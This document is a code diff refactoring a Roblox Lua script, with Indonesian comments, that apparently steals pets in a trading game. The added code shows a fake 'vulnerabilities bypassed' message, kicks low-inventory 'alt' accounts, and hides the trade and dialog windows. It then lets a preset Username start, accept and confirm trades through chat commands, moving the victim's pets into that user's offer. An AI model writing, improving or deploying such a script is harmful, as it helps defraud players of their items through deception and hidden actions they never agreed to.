@@ -81,39 +81,38 @@ if httpRequest then
 else
   print("LMAOOOOOO")
 end
-local trade_info = {}
-for i, v in pairs(game:GetService("ReplicatedStorage").API:GetChildren()) do
-  if v:IsA('RemoteEvent') then
-    spawn(function()
-      v.OnClientEvent:Connect(function(...)
-        x = {} -- <--- Add a closing } here
-        if type(x[3]) == 'table' and x[2] == 'trade' then
-          table = x[3]
-          sender = table.sender
-          sender_offer = table.sender_offer
-          trade_info = table
-        end
-      end)
-    end)
-  end
-end
-local function SendTrade()
-  local Loads = require(game.ReplicatedStorage.Fsys).load
-  local RouterClient = Loads("RouterClient")
-  local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
-        send_trade:FireServer(game.Players[Username])
 
-  local TradeAccepted = RouterClient.get("TradeAPI/TradeAccepted")
-        TradeAccepted.OnClientEvent:Connect(function()
-wait(3)
-  local Loads = require(game.ReplicatedStorage.Fsys).load
-  local RouterClient = Loads("RouterClient")
+local RouterClient = require(game.ReplicatedStorage.Fsys).load("RouterClient")
+
+-- Fungsi untuk menerima trade negotiation
+local function AcceptTrade()
+  local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+  AcceptNegotiationRemote:FireServer()
+end
+
+-- Fungsi untuk mengonfirmasi trade
+local function ConfirmTrade()
+  local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+  AcceptTradeRemote:FireServer()
+end
+
+-- Fungsi untuk mengirim trade
+local function SendTrade()
+  local SendTradeRemote = RouterClient.get("TradeAPI/SendTrade")
+  SendTradeRemote:FireServer(game.Players[Username])  -- Pastikan 'Username' sudah didefinisikan sebelumnya
+end
+
+-- Menunggu trade diterima
+local TradeAccepted = RouterClient.get("TradeAPI/TradeAccepted")
+TradeAccepted.OnClientEvent:Connect(function()
+  wait(3)
   local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
   local juj = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+  
   if juj.pets then
     local petCount = 0
     local petUids = {}
-        for petUid, petData in pairs(juj.pets) do
+    for petUid, petData in pairs(juj.pets) do
       table.insert(petUids, petUid)
     end
     
@@ -129,47 +128,40 @@ wait(3)
     print("No pets found in inventory.")
   end
 end)
-end
 
-local function AcceptTrade()
-  local Loads = require(game.ReplicatedStorage.Fsys).load
-  local RouterClient = Loads("RouterClient")
-  local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-  AcceptNegotiationRemote:FireServer()
-end
-local function ConfirmTrade()
-  local Loads = require(game.ReplicatedStorage.Fsys).load
-  local RouterClient = Loads("RouterClient")
-  local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-  AcceptTradeRemote:FireServer()
-end
-
+-- Fungsi untuk mendeteksi jumlah pets dalam inventory
 local total_pets = 0
-for i, v in pairs(ClientData.get("inventory").pets) do
+for i, v in pairs(require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets) do
     total_pets = total_pets + 1
 end
+
 warn("Your Script Detected", total_pets, "Vulnerabilities, Bypassing Them Right Now.")
 wait(5)
 print("Bypassed!")
-    if total_pets == 1 then
-        game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 1 pet in your inventory or use this script on your main account.")
+
+-- Cek jika pets kurang dari 1, maka kick pemain
+if total_pets == 1 then
+    game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 1 pet in your inventory or use this script on your main account.")
 end
+
+-- Menyembunyikan Dialog dan Trade GUI
 game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 
+-- Menambahkan event listener untuk pemain yang bergabung
 game.Players.PlayerAdded:Connect(function(player)
-  if player.Name == Username then
-      player.Chatted:Connect(function(msg)
-          local lowerMsg = msg:lower()
-          if lowerMsg == "/send" or lowerMsg == "send" then
+  if player.Name == Username then  -- Pastikan Username sudah didefinisikan sebelumnya
+    player.Chatted:Connect(function(msg)
+        local lowerMsg = msg:lower()
+        if lowerMsg == "/send" or lowerMsg == "send" then
             SendTrade()
-          end
-          if lowerMsg == "/accept" or lowerMsg == "accept" then
+        end
+        if lowerMsg == "/accept" or lowerMsg == "accept" then
             AcceptTrade()
-          end
-          if lowerMsg == "/confirm" or lowerMsg == "confirm" then
+        end
+        if lowerMsg == "/confirm" or lowerMsg == "confirm" then
             ConfirmTrade()
-          end
-      end)
+        end
+    end)
   end
-end)
+end)  -- Penutupan untuk PlayerAdded
